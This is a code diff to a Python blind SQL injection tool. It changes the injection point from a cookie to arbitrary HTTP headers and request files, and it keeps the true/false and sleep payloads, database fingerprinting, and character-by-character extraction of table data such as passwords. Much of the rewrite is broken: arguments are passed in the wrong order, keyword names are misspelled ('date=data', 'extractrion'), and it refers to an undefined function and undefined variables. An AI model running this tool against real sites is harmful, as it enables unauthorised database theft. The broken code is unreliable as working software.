@@ -20,11 +20,11 @@ def load_version_queries():
 
 version_queries = load_version_queries()
 
-def is_injectable(url, cookie_name, cookie_value, request_template=None, args=None):
+def is_injectable(url, request_template=None, injectable_headers={}, static_headers={}, args=None):
     """
     Check if the field is injectable by testing with simple SQL payloads.
     First, compare the status codes, and if they are identical, compare the content length.
-    If keywords are provided, override the other methods and use keyword comparison.
+    If keywords are provided, override the other detection methods and use keyword comparison.
     """
     test_payloads = {
         "true_condition": "' AND '1'='1",
@@ -46,11 +46,17 @@ def is_injectable(url, cookie_name, cookie_value, request_template=None, args=No
         start_time = time.time()
         try:
             if request_template:
-                request_content = request_template.replace("INJECT", encoded_payload)
-                response = requests.get(url, data=request_content, timeout=args.timeout)
+                injected_template = request_template.replace("INJECT", encoded_payload)
+                method, url, headers, body = parse_request_template(injected_template)
+                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
             else:
-                cookies = {cookie_name: cookie_value + encoded_payload}
-                response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                headers = {**static_headers}
+                for key, value in injectable_headers.items():
+                    headers[key] = value + encoded_payload
+                if args.data:
+                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                else:
+                    response = requests.get(url, headers=headers, timeout=args.timeout)
 
             end_time = time.time()
             response_time = end_time - start_time
@@ -81,7 +87,7 @@ def is_injectable(url, cookie_name, cookie_value, request_template=None, args=No
     if args.true_keywords or args.false_keywords:
         if args.true_keywords:
             if any(keyword in true_response_content for keyword in args.true_keywords):
-                print("[+] Keyword(s) detected in true condition response. Field is likely injectable!")
+                print("[+] Keyword(s) detected in true condition response. header is likely injectable!")
                 return True, "keyword"
             else:
                 print("[-] No true keywords found in response.")
@@ -100,7 +106,7 @@ def is_injectable(url, cookie_name, cookie_value, request_template=None, args=No
 
     # Step 2: Status codes
     if true_status_code != false_status_code:
-        print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). Field is likely injectable!")
+        print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). header is likely injectable!")
         return True, "status"
 
     # Step 3: Content length
@@ -108,26 +114,25 @@ def is_injectable(url, cookie_name, cookie_value, request_template=None, args=No
     false_content_length = len(false_response_content)
     
     if true_content_length != false_content_length:
-        print(f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). Field is likely injectable!")
+        print(f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). header is likely injectable!")
         if args.verbose:
             print(f"[VERBOSE] True response length: {true_content_length} | False response length: {false_content_length}")
         return True, "content"
 
-    print("[-] No significant status code, content length, or keyword differences detected. Field is likely not injectable.")
+    print("[-] No significant status code, content length, or keyword differences detected. header is likely not injectable.")
     return False, None
 
-def detect_database(url, cookie_name, cookie_value, request_template=None, method="status", args=None):
+def detect_database(url, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
     """
     Attempt to detect the database type by executing various version queries.
-    Use keyword comparison if keywords are provided, otherwise use the selected method (status or content length).
-    If no other methods work, use sleep-based detection as a last resort.
+    Use keyword comparison if keywords are provided, otherwise use the selected detection method (status, content length, sleep, or keywords).
+    If no other detection methods work, use sleep-based detection as a last resort.
     """
+    print("[*] Attempting to detect the database type...")
 
     if args.verbose:
-        print(f"[VERBOSE] Starting detect_database function...")
-        print(f"[VERBOSE] Method selected: {method}")
-
-    print("[*] Attempting to detect the database type...")
+        if not args.sleep_only:
+            print(f"[VERBOSE] Detection method: {detection}")
 
     if args.sleep_only:
         print("[*] Sleep-only mode enabled. Skipping other detection methods...")
@@ -141,13 +146,19 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
                     encoded_payload = quote(payload)
 
                     start_time = time.time()
-                    try:
+                    try: 
                         if request_template:
-                            request_content = request_template.replace("INJECT", encoded_payload)
-                            response = requests.get(url, data=request_content, timeout=args.timeout)
+                            injected_template = request_template.replace("INJECT", encoded_payload)
+                            method, url, headers, body = parse_request_template(injected_template)
+                            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
                         else:
-                            cookies = {cookie_name: cookie_value + encoded_payload}
-                            response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                            headers = {**static_headers}
+                            for key, value in injectable_headers.items():
+                                headers[key] = value + encoded_payload
+                            if args.data:
+                                response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                            else:
+                                response = requests.get(url, headers=headers, timeout=args.timeout)
 
                         end_time = time.time()
                         response_time = end_time - start_time
@@ -163,19 +174,28 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
         return False, None
 
     # Step 1: Baseline request
+    if args.verbose:
+        print(f"[VERBOSE] Sending baseline request...")
     try:
+        start_time = time.time()
         if request_template:
-            request_content = request_template.replace("INJECT", "")
-            baseline_response = requests.get(url, data=request_content, timeout=args.timeout)
+            method, url, headers, body = parse_request_template(request_template)
+            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
         else:
-            cookies = {cookie_name: cookie_value}
-            baseline_response = requests.get(url, cookies=cookies, timeout=args.timeout)
+            headers = {**static_headers, **injectable_headers}
+            if args.data:
+                baseline_response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+            else:
+                baseline_response = requests.get(url, headers=headers, timeout=args.timeout)
         
+        end_time = time.time()
         baseline_status_code = baseline_response.status_code
         baseline_content_length = len(baseline_response.text)
+        response_time = end_time - start_time
 
         if args.verbose:
-            print(f"[VERBOSE] Baseline request status: {baseline_status_code}, length: {baseline_content_length}")
+            print(f"[VERBOSE] Baseline response status: {baseline_response.status_code}, content length: {len(baseline_response.text)}")
+            print(f"[VERBOSE] Response time: {response_time} seconds")
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during baseline request: {e}")
         return None, None
@@ -196,11 +216,17 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
 
         try:
             if request_template:
-                request_content = request_template.replace("INJECT", encoded_payload)
-                response = requests.get(url, data=request_content, timeout=args.timeout)
+                injected_template = request_template.replace("INJECT", encoded_payload)
+                method, url, headers, body = parse_request_template(injected_template)
+                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
             else:
-                cookies = {cookie_name: cookie_value + encoded_payload}
-                response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                headers = {**static_headers}
+                for key, value in injectable_headers.items():
+                    headers[key] = value + encoded_payload
+                if args.data:
+                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                else:
+                    response = requests.get(url, headers=headers, timeout=args.timeout)
 
             if args.delay > 0:
                 if args.verbose:
@@ -216,18 +242,18 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
                 print(f"[VERBOSE] Response content length: {len(response.text)}")
                 print(f"[VERBOSE] Response headers: {response.headers}")
 
-            if method == "keyword":
+            if detection == "keyword":
                 if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                     print(f"[+] True keyword(s) detected in response. Database likely: {db_name}")
                     return db_name, info.get("substring_function", None)
                 if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                     print(f"[+] False keyword(s) detected in response. Database likely: {db_name}")
                     return db_name, info.get("substring_function", None)
-            elif method == "status":
+            elif detection == "status":
                 if response.status_code != baseline_status_code:
                     print(f"[+] Database detected: {db_name} (status code changed: {response.status_code})")
                     return db_name, info.get("substring_function", None)
-            elif method == "content":
+            elif detection == "content":
                 response_content_length = len(response.text)
                 if response_content_length != baseline_content_length:
                     print(f"[+] Database detected: {db_name} (content length changed: {response_content_length})")
@@ -251,11 +277,17 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
                 start_time = time.time()
                 try:
                     if request_template:
-                        request_content = request_template.replace("INJECT", encoded_payload)
-                        response = requests.get(url, data=request_content, timeout=args.timeout)
+                        injected_template = request_template.replace("INJECT", encoded_payload)
+                        method, url, headers, body = parse_request_template(injected_template)
+                        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
                     else:
-                        cookies = {cookie_name: cookie_value + encoded_payload}
-                        response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                        headers = {**static_headers}
+                        for key, value in injectable_headers.items():
+                            headers[key] = value + encoded_payload
+                        if args.data:
+                            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                        else:
+                            response = requests.get(url, headers=headers, timeout=args.timeout)
 
                     end_time = time.time()
                     response_time = end_time - start_time
@@ -281,17 +313,18 @@ def detect_database(url, cookie_name, cookie_value, request_template=None, metho
     print("[-] Unable to detect database type.")
     return None, None
 
-def extract_data(url, cookie_name, cookie_value, table, column, where_clause, string_function, extracted_data, position, db_name, request_template=None, method="status", args=None):
+def extract_data(url, table, column, where_clause, string_function, extracted_data, position, db_name, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
     """
     Perform blind SQL injection to extract the data character by character.
-    Use the selected method to determine success (status code, content length, or keywords).
+    Use the selected extraction method to determine a successful extraction (status code, content length, sleep, or keywords).
     Fallback to sleep-based detection if all other methods fail.
     """
 
     if args.verbose:
         print(f"[VERBOSE] Starting data extraction for {table}.{column}...")
         print(f"[VERBOSE] WHERE clause: {where_clause}")
-        print(f"[VERBOSE] Using method: {method}")
+        if not args.sleep_only:
+            print(f"[VERBOSE] Extraction method: {extraction}")
 
     if args.sleep_only:
         print("[*] Sleep-only mode enabled. Skipping other extraction methods...")
@@ -309,11 +342,17 @@ def extract_data(url, cookie_name, cookie_value, table, column, where_clause, st
                         start_time = time.time()
                         try:
                             if request_template:
-                                request_content = request_template.replace("INJECT", encoded_payload)
-                                response = requests.get(url, data=request_content, timeout=args.timeout)
+                                injected_template = request_template.replace("INJECT", encoded_payload)
+                                method, url, headers, body = parse_request_template(injected_template)
+                                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
                             else:
-                                cookies = {cookie_name: cookie_value + encoded_payload}
-                                response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                                headers = {**static_headers}
+                                for key, value in injectable_headers.items():
+                                    headers[key] = value + encoded_payload
+                                if args.data:
+                                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                                else:
+                                    response = requests.get(url, headers=headers, timeout=args.timeout)
 
                             end_time = time.time()
                             response_time = end_time - start_time
@@ -335,23 +374,27 @@ def extract_data(url, cookie_name, cookie_value, table, column, where_clause, st
         return extracted_data
 
     # Step 1: Baseline request
+    if args.verbose:
+        print(f"[VERBOSE] Sending baseline request...")
     try:
         start_time = time.time()
         if request_template:
-            request_content = request_template.replace("INJECT", "")
-            baseline_response = requests.get(url, data=request_content, timeout=args.timeout)
+            method, url, headers, body = parse_request_template(request_template)
+            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
         else:
-            cookies = {cookie_name: cookie_value}
-            baseline_response = requests.get(url, cookies=cookies, timeout=args.timeout)
+            headers = {**static_headers, **injectable_headers}
+            if args.data:
+                baseline_response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+            else:
+                baseline_response = requests.get(url, headers=headers, timeout=args.timeout)
         
+        end_time = time.time()
         baseline_status_code = baseline_response.status_code
         baseline_content_length = len(baseline_response.text)
-        end_time = time.time()
         response_time = end_time - start_time
 
         if args.verbose:
-            print(f"[VERBOSE] Baseline request sent.")
-            print(f"[VERBOSE] Baseline status code: {baseline_response.status_code}, content length: {len(baseline_response.text)}")
+            print(f"[VERBOSE] Baseline response status: {baseline_response.status_code}, content length: {len(baseline_response.text)}")
             print(f"[VERBOSE] Response time: {response_time} seconds")
 
     except requests.exceptions.RequestException as e:
@@ -369,11 +412,17 @@ def extract_data(url, cookie_name, cookie_value, table, column, where_clause, st
 
             try:
                 if request_template:
-                    request_content = request_template.replace("INJECT", encoded_payload)
-                    response = requests.get(url, data=request_content, timeout=args.timeout)
+                    injected_template = request_template.replace("INJECT", encoded_payload)
+                    method, url, headers, body = parse_request_template(injected_template)
+                    response = send_request(method=method, url=url, headers=headers, body=body, args=args)
                 else:
-                    cookies = {cookie_name: cookie_value + encoded_payload}
-                    response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                    headers = {**static_headers}
+                    for key, value in injectable_headers.items():
+                        headers[key] = value + encoded_payload
+                    if args.data:
+                        response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                    else:
+                        response = requests.get(url, headers=headers, timeout=args.timeout)
 
                 if args.delay > 0:
                     time.sleep(args.delay)
@@ -431,11 +480,17 @@ def extract_data(url, cookie_name, cookie_value, table, column, where_clause, st
                         start_time = time.time()
                         try:
                             if request_template:
-                                request_content = request_template.replace("INJECT", encoded_payload)
-                                response = requests.get(url, data=request_content, timeout=args.timeout)
+                                injected_template = request_template.replace("INJECT", encoded_payload)
+                                method, url, headers, body = parse_request_template(injected_template)
+                                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
                             else:
-                                cookies = {cookie_name: cookie_value + encoded_payload}
-                                response = requests.get(url, cookies=cookies, timeout=args.timeout)
+                                headers = {**static_headers}
+                                for key, value in injectable_headers.items():
+                                    headers[key] = value + encoded_payload
+                                if args.data:
+                                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+                                else:
+                                    response = requests.get(url, headers=headers, timeout=args.timeout)
 
                             end_time = time.time()
                             response_time = end_time - start_time
@@ -462,18 +517,84 @@ def load_request_template(file_path):
     """
     try:
         with open(file_path, 'r') as f:
-            request_template = f.read()
-        return request_template
+            file_content = f.read()
+        return parse_request_file(file_content)
     except Exception as e:
         print(f"[-] Error reading request file: {e}")
+        return None, None, None, None
+
+def parse_request_template(file_content):
+    """
+    Parse a raw HTTP request file and return method, URL, headers, and body.
+    """
+    lines = file_content.splitlines()
+    
+    if not lines:
+        raise ValueError("The request file content is empty")
+
+    request_line = lines[0].strip()
+    
+    try:
+        method, url, _ = request_line.split(' ', 2)
+    except ValueError:
+        raise ValueError("Invalid request line: Unable to parse method and URL")
+    
+    headers = {}
+    body = None
+    is_body = False
+
+    for line in lines[1:]:
+        line = line.strip()
+
+        if not line and not is_body:
+            is_body = True
+            continue
+
+        if is_body:
+            if body is None:
+                body = line
+            else:
+                body += "\n" + line
+        else:
+            if ': ' in line:
+                key, value = line.split(':', 1)
+                headers[key.strip()] = value.strip()
+            else:
+                raise ValueError(f"Invalid header format: {line}")
+
+    return method, url, headers, body
+
+def send_request(url=None, headers=None, data=None, method="GET", args=None):
+    """
+    Send an HTTP request using the parsed information.
+    """
+    try:
+        if method == "POST":
+            response = requests.post(url, headers=headers, data=data, timeout=args.timeout)
+        elif method == "PUT":
+            response = requests.put(url, headers=headers, date=data, timeout=args.timeout)
+        elif method == "PATCH":
+            response = requests.patch(url, headers=headers, data=data, timeout=args.timeout)
+        elif method == "GET":
+            response = requests.get(url, headers=headers, timeout=args.timeout)
+        elif method == "DELETE":
+            response = requests.delete(url, headers=headers, timeout=args.timeout)
+        elif method == "HEAD":
+            response = requests.head(url, headers=headers, timeout=args.timeout)
+        elif method == "OPTIONS":
+            response = requests.options(url, headers=headers, timeout=args.timeout)
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error during {method} request: {e}")
         return None
 
 def main():
-    parser = argparse.ArgumentParser(description="Blind SQL Injection Script with Cookie and File Support")
+    parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")
 
-    parser.add_argument('-u', '--url', required=True, help="Target URL")
-    parser.add_argument('-cn', '--cookie-name', required=False, help="Name of the cookie field")
-    parser.add_argument('-cv', '--cookie-value', required=False, help="Value of the cookie field")
+    parser.add_argument('-u', '--url', required=False, help="Target URL")
+    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'), help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
+    parser.add_argument('-sh', '--static-header', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
+    parser.add_argument('-d','--data', required=False, help="Specify data to be sent in the request body. Changes request type to POST.")
     parser.add_argument('-f', '--file', required=False, help="File containing the HTTP request with 'INJECT' placeholder for payloads")
     parser.add_argument('-t', '--table', required=False, help="Table name from which to extract the data")
     parser.add_argument('-c', '--column', required=False, help="Column name to extract (e.g., Password)")
@@ -487,22 +608,38 @@ def main():
 
     args = parser.parse_args()
 
+    if not args.url and not args.file:
+        print("[-] You must provide either a URL (-u) or a request file (-f).")
+        return
+    if args.url and not (args.injectable_headers or args.data):
+        print("[-] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
+        return
+    if (args.headers or args.data) and not (args.table or args.column or args.where):
+        print("[-] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
+
+    injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
+    static_headers = dict(args.static_header) if args.static_header else {}
+
     request_template = None
     if args.file:
         request_template = load_request_template(args.file)
         if not request_template:
             return
 
-    # Check if the field is injectable
-    injectable, detection_method = is_injectable(args.url, args.cookie_name, args.cookie_value, request_template, args=args)
+    if not args.url and not request_template:
+        print("[-] A valid request template or URL must be provided.")
+        return
+
+    # Step 1: Check if the header is injectable
+    injectable, detection = is_injectable(args.url, injectable_headers, static_headers, request_template, args=args)
     if not injectable:
         return
 
-    print(f"[+] Field is injectable using {detection_method} method.")
+    print(f"[+] header is injectable using {detection} method.")
     print("[+] Checking database type and corresponding substring function...")
 
-    # Detect the database type
-    db_type, string_function = detect_database(args.url, args.cookie_name, args.cookie_value, request_template, method=detection_method, args=args)
+    # Step 2: Detect the database type
+    db_type, string_function = detect_database(args.url, injectable_headers, static_headers, request_template, detection=detection, args=args)
 
     if not db_type:
         print("[-] Unable to detect database type.")
@@ -511,14 +648,13 @@ def main():
         print(f"[*] Database {db_type} detected, but substring operations are not applicable.")
         return
 
-    # Extract the data
+    # Step 3: Extract the data
     extracted_data = ""
     position = 1
     if args.table and args.column and args.where:
         extracted_data = extract_data(
             args.url, 
-            args.cookie_name, 
-            args.cookie_value, 
+            injectable_headers,
             args.table, 
             args.column, 
             args.where, 
@@ -527,7 +663,8 @@ def main():
             position, 
             db_type,
             request_template,
-            method=detection_method,
+            static_headers,
+            extractrion=detection,
             args=args
         )
         print(f"Extracted data: {extracted_data}")
